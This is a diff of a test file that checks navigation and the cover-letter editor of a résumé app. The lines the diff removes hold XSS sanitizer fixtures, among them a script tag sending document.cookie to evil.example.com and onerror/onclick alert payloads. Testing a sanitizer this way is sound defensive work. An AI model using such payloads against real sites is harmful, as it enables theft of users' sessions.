@@ -356,8 +356,11 @@ console.log('── tapping a page opens it, and the two actions are the REAL sc
 ok('the zoom grows from the tapped rectangle, measured', /measureInWindow/.test(strip(carousel)) && /onOpen\(i, w \? \{ x, y, w, h \}/.test(strip(carousel)));
 ok('the transition is transform-only (native driver, one tree)',
   /translateX: lerp\(tx0, 0\)/.test(zoomC) && /scale: lerp\(scale0, 1\)/.test(zoomC) && !/useNativeDriver: false/.test(zoomC));
+// ⚠️ RETARGETED 2026-09-19: the push carries `from: 'home'` so the editor's Back returns to Home
+// (test-customize-nav.js runs that for real).
 ok('Customize opens the SECTION EDITOR (and the builder when it is only a sample)',
-  /if \(sample\) armBuilderFor\(target\)/.test(homeC) && /nav\(\)\?\.push\?\.\('\/\(resume-builder\)\/preview'\)/.test(homeC));
+  /if \(sample\) armBuilderFor\(target\)/.test(homeC)
+  && /nav\(\)\?\.push\?\.\(\{ pathname: '\/\(resume-builder\)\/preview', params: \{ from: 'home' \} \}\)/.test(homeC));
 ok('⚠️ Customize NEVER arms the paid auto-build lane',
   !/autoBuild[\s\S]{0,80}home_customize/.test(homeC) && (homeC.match(/autoBuild: true/g) || []).length === 1);
 ok('View PDF opens the gallery ON the tapped design',
@@ -1605,9 +1608,10 @@ console.log('── ⚠️ A LIBRARY CARD OPENS ITS PAGE — IT NEVER DOWNLOADS 
     /if \(libZoom\.kind === 'cover_letter'\) \{ openLetterPicker\(id, libZoom\.doc\); return; \}/.test(homeC)
     && /openResumeGallery\(id, libZoom\.doc, \{ company: libZoom\.employer, role: '' \}\);/.test(homeC));
   const cz = fnBodyOf(homeC, 'customizeResume');
-  ok('customizeResume: a saved doc → /(resume-builder)/preview { docId }; none → /(resume-builder)/preview',
-    /pathname: '\/\(resume-builder\)\/preview', params: \{ docId: String\(d\.docId\) \}/.test(cz)
-    && /nav\(\)\?\.push\?\.\('\/\(resume-builder\)\/preview'\)/.test(cz) && /if \(sample\) armBuilderFor\(target\)/.test(cz));
+  ok('customizeResume: a saved doc → /(resume-builder)/preview { docId, from: home }; none → { from: home }',
+    /pathname: '\/\(resume-builder\)\/preview', params: \{ docId: String\(d\.docId\), from: 'home' \}/.test(cz)
+    && /nav\(\)\?\.push\?\.\(\{ pathname: '\/\(resume-builder\)\/preview', params: \{ from: 'home' \} \}\)/.test(cz)
+    && /if \(sample\) armBuilderFor\(target\)/.test(cz));
   const gz = fnBodyOf(homeC, 'openResumeGallery');
   ok('openResumeGallery: /(resume-builder)/templates { template, employer, docId }',
     /pathname: '\/\(resume-builder\)\/templates'/.test(gz) && /\.\.\.\(id \? \{ template: id \} : \{\}\)/.test(gz)
@@ -1686,63 +1690,18 @@ console.log('── ⚠️ THE LETTER EDITOR: the user\'s words in, only p/br/st
   const edC = strip(edSrc);
   const layoutSrc = R('../app/(cover-letter)/_layout.tsx');
   ok('the route is registered in the (cover-letter) stack', /<Stack\.Screen name="edit" \/>/.test(layoutSrc));
-  const a = edSrc.indexOf('const DROP_WITH_CONTENT_RE'), b = edSrc.indexOf('/* ── THE SCREEN');
-  let toText = null, toHtml = null;
-  if (a > 0 && b > a) {
-    try {
-      const js = ts.transpileModule(edSrc.slice(a, b), { compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2019 } }).outputText;
-      const m = { exports: {} };
-      new Function('module', 'exports', js)(m, m.exports);
-      toText = m.exports.letterHtmlToText; toHtml = m.exports.letterTextToHtml;
-    } catch (e) { console.log('     (edit.tsx converters did not load: ' + String(e.message).split('\n')[0] + ')'); }
-  }
-  ok('letterHtmlToText / letterTextToHtml load as pure functions', typeof toText === 'function' && typeof toHtml === 'function');
-  if (toText && toHtml) {
-    const stored = '<p>Dear Airbus team,</p>\n<p>I led <strong>Node.js</strong> and <b>PostgreSQL</b> work.<br>Across <em>payments</em> &amp; reliability.</p>'
-      + '<script>fetch("https://evil.example.com/?c="+document.cookie)</script><style>p{display:none}</style>'
-      + '<p onclick="alert(1)">Kind regards,<br/>Test Person</p><img src=x onerror=alert(1)><iframe src="http://127.0.0.1/admin">inner</iframe>';
-    const t = toText(stored);
-    ok('HTML → text: <p> = paragraphs, <br> = a line, <strong>/<b> = **bold**, other tags stripped, entities decoded',
-      t === 'Dear Airbus team,\n\nI led **Node.js** and **PostgreSQL** work.\nAcross payments & reliability.\n\nKind regards,\nTest Person', t);
-    ok('⚠️ …a <script>/<style>/<iframe> goes WITH its contents — not a word of it reaches the editor',
-      !/evil|cookie|fetch|display:none|inner|alert|onerror|onclick/.test(t), t);
-    ok('⚠️ …an unterminated <script> swallows the rest rather than leaking it', toText('<p>Hi</p><script>steal()') === 'Hi');
-    ok('…one decode pass: "&amp;lt;b&amp;gt;" is the TEXT "&lt;b&gt;", never markup', toText('<p>&amp;lt;b&amp;gt;</p>') === '&lt;b&gt;');
-
-    const typed = 'Dear team,\n\nI built **payment systems** & more.\nSecond line <script>alert(1)</script>\n\n\n<img src=x onerror=alert(1)> **x**';
-    const h = toHtml(typed);
-    ok('text → HTML: blank lines = <p>, a newline = <br>, **x** = <strong>x</strong>, everything else escaped',
-      h === '<p>Dear team,</p><p>I built <strong>payment systems</strong> &amp; more.<br>Second line &lt;script&gt;alert(1)&lt;/script&gt;</p>'
-        + '<p>&lt;img src=x onerror=alert(1)&gt; <strong>x</strong></p>', h);
-    const tags = [...h.matchAll(/<\/?([a-z0-9]+)/gi)].map((x) => x[1].toLowerCase());
-    ok('⚠️ …the ONLY tags that leave the editor are p, br and strong (the server keeps p/br/strong/b/em/i/ul/ol/li)',
-      tags.length > 0 && tags.every((x) => x === 'p' || x === 'br' || x === 'strong'), [...new Set(tags)]);
-    ok('…a lone ** stays literal, and an empty letter is no markup at all', toHtml('5 ** 2') === '<p>5 ** 2</p>' && toHtml('  \n\n ') === '');
-    const back = toText(toHtml(t));
-    ok('round trip: text → HTML → text is unchanged (bold and paragraphs kept)', back === t, back);
-
-    // ⚠️ BOLD NEVER MERGES ACROSS A BREAK (the reviewer's letter, 2026-09-14). The old merge joined "**", any \s
-    // gap (and \s includes \n), "**" — so two bold paragraphs became ONE bold run spanning a blank line, which
-    // letterTextToHtml (bold matched inside one paragraph) saved back as literal asterisks with the bold gone.
-    const REVIEWER = '<p><strong>Re: Application for Engineer</strong></p><p><strong>Dear Ms. Smith,</strong></p><p>Body</p>';
-    const rt = toText(REVIEWER);
-    ok('⚠️ two bold paragraphs stay two bold paragraphs', rt === '**Re: Application for Engineer**\n\n**Dear Ms. Smith,**\n\nBody', rt);
-    ok('⚠️ …and saving gives back the same HTML: bold kept, not one asterisk', toHtml(rt) === REVIEWER && !/\*/.test(toHtml(rt)), toHtml(rt));
-    ok('…stable on a second round trip', toText(toHtml(rt)) === rt);
-    const lineBr = toText('<p><strong>One</strong><br><strong>Two</strong></p>');
-    ok('⚠️ bold on both sides of a <br> is NOT merged, and round-trips', lineBr === '**One**\n**Two**' && toHtml(lineBr) === '<p><strong>One</strong><br><strong>Two</strong></p>', lineBr);
-    const everyLine = (x) => x.split('\n').every((l) => ((l.match(/\*\*/g) || []).length % 2) === 0);
-    const openAcross = toText('<p><strong>Open</p><p>still bold</strong> plain</p>');
-    ok('⚠️ a <strong> left open over </p> keeps the next paragraph bold, with markers balanced on EVERY line',
-      openAcross === '**Open**\n\n**still bold** plain' && everyLine(openAcross) && !/\*/.test(toHtml(openAcross)), openAcross);
-    ok('same-line runs still merge: <strong>Hello</strong> <strong>World</strong> (and &nbsp;) → one run',
-      toText('<p><strong>Hello</strong> <strong>World</strong></p>') === '**Hello World**'
-      && toText('<p><strong>Hello</strong>&nbsp;<strong>World</strong></p>') === '**Hello World**');
-    const listed = '<ul><li><strong>Led</strong> a team</li><li><strong>Built</strong> APIs</li></ul>';
-    const lt = toText(listed);
-    ok('bold list items: one "• " line each, balanced, never merged into each other', lt === '• **Led** a team\n• **Built** APIs' && everyLine(lt), lt);
-    ok('nested <b> inside <strong> is one bold run, not "****"', toText('<p><strong>a <b>b</b> c</strong></p>') === '**a b c**');
-  }
+  // ⚠️ RETARGETED 2026-09-19: the one-textbox editor (letterHtmlToText / letterTextToHtml, bold as **asterisks**) is
+  // gone — the owner asked for the résumé page's twin: one card per paragraph, bold SHOWN bold and edited in the same
+  // Quill box. The conversions moved to services/letterHtml.ts and scripts/test-letter-editor.js drives them (and the
+  // page) for real; what stays here is the contract Home relies on, read from the source.
+  const lhSrc = R('../services/letterHtml.ts');
+  ok('the old **markdown** converters are gone from the page', !/letterHtmlToText|letterTextToHtml/.test(edSrc));
+  ok('⚠️ the letter becomes paragraph CARDS through services/letterHtml (split / join / the Quill box\'s answer)',
+    /import \{[^}]*\bsplitLetterParagraphs\b[^}]*\bjoinLetterParagraphs\b[^}]*\bquillToBlocks\b[^}]*\} from '\.\.\/\.\.\/services\/letterHtml';/.test(edSrc)
+    && /export function cleanInline\(/.test(lhSrc) && /export function splitLetterParagraphs\(/.test(lhSrc));
+  ok('⚠️ …and a card is edited in the résumé\'s own Quill box, narrowed to bold (the Original PDF prints no italic)',
+    /from '\.\.\/\.\.\/components\/rich-text\/RichText';/.test(edSrc) && /const LETTER_FORMATS: RichFormat\[\] = \['bold'\];/.test(edC)
+    && /<RichTextModal[\s\S]{0,200}formats=\{LETTER_FORMATS\}/.test(edC));
   // ⚠️ RETARGETED 2026-09-14: goneOut no longer calls router.back() itself. It sets `exit`, and the back runs in the
   // exit effect — a render later, once the usePreventRemove guard (dirty && !exit) is down, or the guard would
   // swallow the very navigation that takes the user off a deleted letter.
@@ -1760,18 +1719,19 @@ console.log('── ⚠️ THE LETTER EDITOR: the user\'s words in, only p/br/st
     && !/addListener\('beforeRemove'/.test(edC) && !/gestureEnabled/.test(edC)
     && /const \[exit, setExit\] = useState/.test(edC));
   ok('⚠️ a resume docId is refused, so it can never be saved back as a letter', /if \(d\.kind !== 'cover_letter'\)/.test(edC));
-  ok('Save sends { ...payload, subject, coverLetterHtml } to saveDocPayload(docId, …)',
-    /const payload = \{ \.\.\.doc\.payload, subject: wantSubject, coverLetterHtml: html \};/.test(edC)
-    && /await saveDocPayload\(docId, payload\)/.test(edC) && /const html = letterTextToHtml\(wantBody\);/.test(edC));
+  // ⚠️ RETARGETED 2026-09-19: one write path for every card (persist), and only what changed rides in it.
+  ok('every save is saveDocPayload(docId, …) — a field card writes only what changed, the letter HTML as stored',
+    (edC.match(/saveDocPayload\(/g) || []).length === 1 && /await saveDocPayload\(docId, next\)/.test(edC)
+    && /const next = withLetterFields\(doc\.payload, opened, draft, profileSender\);/.test(edC));
   ok('⚠️ any failure is "not saved", out loud — never a pretend success',
-    /\.catch\(\(\) => \(\{ ok: false as const, reason: 'network'/.test(edC) && /setSave\(\{ state: 'error', message \}\)/.test(edC)
-    && /Alert\.alert\('Not saved', r\.error\)/.test(edC) && /if \(r\.ok\) \{/.test(edC));
+    /\.catch\(\(\) => \(\{ ok: false as const, reason: 'network'/.test(edC) && /Alert\.alert\('Could not save', r\.message/.test(edC)
+    && /if \(r\.ok\) \{/.test(edC) && /setBodyError\('Your last paragraph change is not saved yet\.'\)/.test(edC));
   const og = fnBodyOf(edC, 'openGallery');
   ok('View PDF writes coverLetterPickerContext { coverLetterHtml, companyName, companyAddress, employer, docId } and opens the gallery by docId',
     /AsyncStorage\.setItem\('coverLetterPickerContext', JSON\.stringify\(\{\s*coverLetterHtml: html,\s*companyName: p\.companyName,\s*companyAddress: p\.companyAddress,\s*employer: doc\.employer,\s*docId,\s*\}\)\)/.test(og)
     && /router\.push\(\{ pathname: '\/\(cover-letter\)\/templates', params: \{ docId: String\(docId\) \} \}/.test(og), og.slice(0, 400));
   ok('⚠️ …with unsaved edits it saves FIRST (the gallery renders the server\'s copy)',
-    /if \(!dirty\) \{ openGallery\(base\.html\); return; \}\s*const r = await doSave\(\);/.test(edC));
+    /if \(bodyDraft === null\) \{ openGallery\(storedHtml\); return; \}[\s\S]{0,80}if \(await retryBody\(\{ quiet: true \}\)\) \{ openGallery\(pending\); return; \}/.test(edC));
   ok('⚠️ the editor never generates or charges', !/generate|consumeOnSuccess|checkBuildGate|buildFor\(|autoBuild|\/cover-letter\/employer-build/.test(edC));
   ok('Ionicons only, and expo-file-system (if ever) from /legacy', !/MaterialIcons|FontAwesome|Feather/.test(edSrc) && !/from 'expo-file-system'/.test(edSrc));
 }
